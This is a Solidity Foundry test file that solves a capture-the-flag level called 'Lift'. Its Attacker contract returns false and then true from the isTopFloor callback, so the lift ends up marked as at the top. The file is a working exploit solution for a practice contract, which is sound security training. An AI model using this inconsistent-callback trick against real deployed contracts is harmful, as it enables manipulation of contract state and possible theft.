// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "src/07_Lift/Lift.sol";

// forge test --match-contract LiftTest
contract LiftTest is BaseTest {
    Lift instance;
    bool isTop = true;

    function setUp() public override {
        super.setUp();

        instance = new Lift();
    }

    function testExploitLevel() public {
        Attacker attacker = new Attacker(instance);
        attacker.attack();

        checkSuccess();
    }

    function checkSuccess() internal view override {
        assertTrue(instance.top(), "Solution is not solving the level");
    }
}

contract Attacker is House {
    Lift instance;
    bool firstCall = true;

    constructor(Lift _instance) {
        instance = _instance;
    }

    function attack() public {
        instance.goToFloor(1);
    }

    function isTopFloor(uint256) external override returns (bool) {
        if (firstCall) {
            firstCall = false;
            return false;
        } else {
            return true;
        }
    }
}